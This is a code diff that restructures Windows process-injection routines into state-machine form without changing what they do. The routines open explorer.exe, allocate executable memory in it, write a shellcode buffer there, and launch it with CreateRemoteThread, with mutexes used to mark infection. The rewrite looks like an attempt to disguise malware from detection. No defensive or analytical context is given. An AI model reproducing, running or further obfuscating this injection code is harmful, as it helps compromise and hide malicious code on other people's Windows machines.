@@ -102,39 +102,147 @@ DWORD GetProcessIdFromName(char *ProcessName)
 	return 0;     
 }
 
-HANDLE InjectShellcode(HANDLE hProcess, unsigned char *Shellcode, int ShellcodeLen)
+HANDLE InjectShellcode(HANDLE hProcess, unsigned char* Shellcode, int ShellcodeLen)
 {
+	enum State {
+		ALLOCATE_MEMORY,
+		WRITE_SHELLCODE,
+		CREATE_REMOTE_THREAD,
+		RETURN_RESULT
+	};
+
+	State state = ALLOCATE_MEMORY;
 	DWORD BytesWritten, TID;
-	LPVOID pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	if (pThread != NULL) WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten);
-	HANDLE ThreadHandle =  CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pThread, NULL, 0, &TID);
+	LPVOID pThread = nullptr;
+	HANDLE ThreadHandle = nullptr;
+
+	while (state != RETURN_RESULT) {
+		switch (state) {
+		case ALLOCATE_MEMORY:
+			pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			if (pThread != NULL) {
+				state = WRITE_SHELLCODE;
+			}
+			else {
+				state = RETURN_RESULT;
+			}
+			break;
+
+		case WRITE_SHELLCODE:
+			if (WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten)) {
+				state = CREATE_REMOTE_THREAD;
+			}
+			else {
+				state = RETURN_RESULT;
+			}
+			break;
+
+		case CREATE_REMOTE_THREAD:
+			ThreadHandle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThread, NULL, 0, &TID);
+			state = RETURN_RESULT;
+			break;
+
+		case RETURN_RESULT:
+			// End state
+			break;
+		}
+	}
+
 	return ThreadHandle;
 }
 
+
 bool ShellcodeInjected()
 {
-	HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, false, "SHELLCODE_MUTEX");
-	if (hMutex == NULL)
-	{
-		return false;
+	enum State {
+		OPEN_MUTEX,
+		RETURN_RESULT
+	};
+
+	State state = OPEN_MUTEX;
+	HANDLE hMutex = nullptr;
+	bool result = false;
+
+	while (state != RETURN_RESULT) {
+		switch (state) {
+		case OPEN_MUTEX:
+			hMutex = OpenMutex(MUTEX_ALL_ACCESS, false, "SHELLCODE_MUTEX");
+			if (hMutex == NULL) {
+				result = false;
+			}
+			else {
+				CloseHandle(hMutex);
+				result = true;
+			}
+			state = RETURN_RESULT;
+			break;
+
+		case RETURN_RESULT:
+			// End state
+			break;
+		}
 	}
-	else
-	{
-		CloseHandle(hMutex);
-		return true;
-	}
+
+	return result;
 }
+
 
 void InitiateMonitoringThread()
 {
-	CreateMutex(NULL, 0, "7YhngylKo09H");	
-	if (!(ShellcodeInjected()))
-	{
-		DWORD ProcessId = GetProcessIdFromName("explorer.exe");
-		HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, ProcessId);
-		if (hProcess != 0) 
-		{
+	enum State {
+		CREATE_MUTEX,
+		CHECK_SHELLCODE_INJECTED,
+		GET_PROCESS_ID,
+		OPEN_PROCESS,
+		INJECT_SHELLCODE,
+		RETURN_RESULT
+	};
+
+	State state = CREATE_MUTEX;
+	HANDLE hProcess = nullptr;
+	DWORD ProcessId;
+	bool shellcodeInjected = false;
+
+	while (state != RETURN_RESULT) {
+		switch (state) {
+		case CREATE_MUTEX:
+			CreateMutex(NULL, 0, "7YhngylKo09H");
+			state = CHECK_SHELLCODE_INJECTED;
+			break;
+
+		case CHECK_SHELLCODE_INJECTED:
+			shellcodeInjected = ShellcodeInjected();
+			if (!shellcodeInjected) {
+				state = GET_PROCESS_ID;
+			}
+			else {
+				state = RETURN_RESULT;
+			}
+			break;
+
+		case GET_PROCESS_ID:
+			ProcessId = GetProcessIdFromName("explorer.exe");
+			state = OPEN_PROCESS;
+			break;
+
+		case OPEN_PROCESS:
+			hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, ProcessId);
+			if (hProcess != nullptr) {
+				state = INJECT_SHELLCODE;
+			}
+			else {
+				state = RETURN_RESULT;
+			}
+			break;
+
+		case INJECT_SHELLCODE:
 			InjectShellcode(hProcess, mthread, sizeof(mthread));
+			state = RETURN_RESULT;
+			break;
+
+		case RETURN_RESULT:
+			// End state
+			break;
 		}
 	}
 }
